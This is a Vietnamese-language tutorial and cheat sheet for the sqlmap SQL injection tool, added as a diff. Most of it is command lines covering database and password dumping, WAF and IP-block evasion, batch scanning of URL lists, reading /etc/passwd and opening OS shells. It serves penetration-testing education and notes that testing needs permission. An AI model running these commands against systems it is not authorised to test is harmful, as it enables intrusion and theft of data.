@@ -1,0 +1,163 @@
+1. SQLmap là gì?
+
+    SQLmap là công cụ mã nguồn mở tự động phát hiện và khai thác lỗ hổng SQL Injection trên website/web app.
+
+    Có thể:
+
+        Tự động tìm ra SQLi, khai thác, lấy dữ liệu, dump bảng, database, user, mật khẩu, v.v.
+
+        Thử rất nhiều kỹ thuật (Boolean, Error, Union, Time, Stack…)
+
+        Hỗ trợ MySQL, MSSQL, Oracle, PostgreSQL, SQLite, SAP MaxDB, Sybase, Firebird, v.v.
+
+        Có khả năng thực hiện takeover, file read/write, command execution (khi có lỗ hổng đủ sâu).
+
+    Dùng mạnh nhất khi kiểm thử pentest, bug bounty, audit bảo mật website.
+
+2. Cài đặt SQLmap
+A. Trên Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install sqlmap
+
+    Kiểm tra: sqlmap --version
+
+B. Cài từ nguồn (luôn mới nhất)
+
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+cd sqlmap-dev
+python3 sqlmap.py --help
+
+3. Sử dụng SQLmap cơ bản
+Quét 1 URL nghi ngờ SQLi
+
+sqlmap -u "http://site.com/page.php?id=1"
+
+Scan POST request (form)
+
+sqlmap -u "http://site.com/login.php" --data="username=admin&password=123456"
+
+Scan URL có cookie/session
+
+sqlmap -u "http://site.com/profile.php?id=1" --cookie="PHPSESSID=abcd1234"
+
+4. Các tùy chọn cơ bản và ý nghĩa
+Tham số	Ý nghĩa
+-u	Đường dẫn URL cần test
+--data	Dữ liệu POST (cho form login, register, search…)
+--cookie	Thêm cookie/session
+--level	Độ sâu test (1-5, mặc định 1; càng cao càng sâu)
+--risk	Mức độ mạo hiểm test (1-3, mặc định 1)
+--batch	Không hỏi lại, tự động xác nhận “Yes”
+--random-agent	Đổi User-Agent khi scan
+--proxy	Dùng proxy (Burp/ZAP debug, ẩn IP)
+-p	Chỉ định tham số cần test (vd: id, user)
+
+Ví dụ:
+
+sqlmap -u "http://site.com/page.php?id=1" --level=3 --risk=2 --batch --random-agent
+
+5. Nâng cao: Dump dữ liệu, brute-force, takeover
+A. Xem danh sách database
+
+sqlmap -u "http://site.com/page.php?id=1" --dbs
+
+B. Xem table trong database
+
+sqlmap -u "http://site.com/page.php?id=1" -D <tên_database> --tables
+
+C. Xem cột trong bảng
+
+sqlmap -u "http://site.com/page.php?id=1" -D <tên_database> -T <tên_bảng> --columns
+
+D. Dump dữ liệu cột
+
+sqlmap -u "http://site.com/page.php?id=1" -D <tên_database> -T <tên_bảng> -C <tên_cột> --dump
+
+E. Dump toàn bộ dữ liệu
+
+sqlmap -u "http://site.com/page.php?id=1" --dump-all
+
+6. Bypass WAF, bảo mật, anti-bot
+
+    Đổi User-Agent: --random-agent
+
+    Proxy qua Burp/ZAP: --proxy="http://127.0.0.1:8080"
+
+    Fake referer/header: --referer, --headers
+
+    Giảm tốc scan: --delay=2
+
+    Kỹ thuật encode, tamper: --tamper=space2comment,randomcase,between
+
+        Xem list file tamper: /usr/share/sqlmap/tamper/ hoặc tại đây
+
+        Ví dụ:
+
+        sqlmap -u "http://site.com/page.php?id=1" --tamper=space2comment
+
+7. Scan nhiều URL tự động (batch)
+
+    Chuẩn bị file list.txt (1 dòng 1 URL)
+
+cat list.txt | xargs -I % sqlmap -u "%" --batch --level=2 --risk=2
+
+    Hoặc:
+
+for url in $(cat list.txt); do sqlmap -u "$url" --batch; done
+
+8. Khám phá chức năng nâng cao
+Tham số	Ý nghĩa
+--os-shell	Có shell truy cập hệ điều hành (khi RCE)
+--os-pwn	Tự động khai thác để lấy shell/reverse shell
+--file-read <đường_dẫn>	Đọc file trên server
+--file-write <file> --file-dest <đích>	Gửi file lên server
+--passwords	Dump tất cả password
+--threads <số>	Đa luồng scan
+--identify-waf	Phát hiện loại WAF bảo vệ web
+
+Ví dụ:
+
+sqlmap -u "http://site.com/page.php?id=1" --os-shell
+sqlmap -u "http://site.com/page.php?id=1" --file-read="/etc/passwd"
+
+9. Phối hợp tool khác
+
+    Burp Suite/ZAP: Intercept request, export “request.txt”, quét chính xác hơn:
+
+    sqlmap -r request.txt
+
+    Nmap, Nikto, Nuclei: Quét sơ bộ trước, lấy list URL hoặc tham số input đưa cho SQLmap.
+
+10. Xuất kết quả, báo cáo
+
+    Kết quả lưu tại thư mục sqlmap/output/
+
+    Có thể export ra TXT, CSV (tùy script), hoặc parse log cho báo cáo pentest.
+
+11. Các mẹo & trick thực chiến
+
+    Khi không tìm được bug, hãy tăng --level, --risk, thử thêm tamper, đổi proxy, fake header…
+
+    Scan cả POST/GET, header, cookie… vì SQLi có thể xuất hiện ở nhiều nơi.
+
+    Luôn test trên site bạn được phép kiểm thử!
+
+    Xem log, error của SQLmap để đoán query và bypass.
+
+12. Một số lỗi thường gặp & cách xử lý
+Lỗi	Nguyên nhân & fix
+Không phát hiện SQLi	Thử tăng level/risk, thêm tamper, check lại tham số
+Web bị block IP	Đổi IP, dùng proxy, giảm tốc scan
+Timeout	Dùng --timeout=30, giảm thread
+WAF chặn	Thử tamper, fake header, scan chậm lại
+Không dump được data	Có thể tài khoản DB bị hạn chế quyền, hoặc cần exploit sâu hơn
+13. Tài liệu và link hữu ích
+
+    SQLmap Official
+
+    SQLmap Github
+
+    SQLmap User Guide (Wiki)
+
+    sqlmap --help
